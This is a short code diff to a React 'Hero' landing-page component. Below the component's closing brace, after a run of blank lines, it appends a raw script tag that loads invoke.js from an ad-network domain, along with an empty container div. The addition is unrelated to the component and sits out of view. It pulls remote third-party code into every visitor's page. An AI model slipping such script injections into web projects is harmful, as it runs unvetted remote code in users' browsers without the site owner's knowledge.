@@ -32,9 +32,18 @@ export function Hero() {
                 <ArrowRight className="ml-2 h-5 w-5" />
               </Button>
             </Link>
+
+
+
+
           </div>
         </div>
       </div>
     </section>
   )
 }
+
+
+
+<script async="async" data-cfasync="false" src="//pl27309673.profitableratecpm.com/207c70d3191ba8b90daf1933d5003734/invoke.js"></script>
+<div id="container-207c70d3191ba8b90daf1933d5003734"></div>
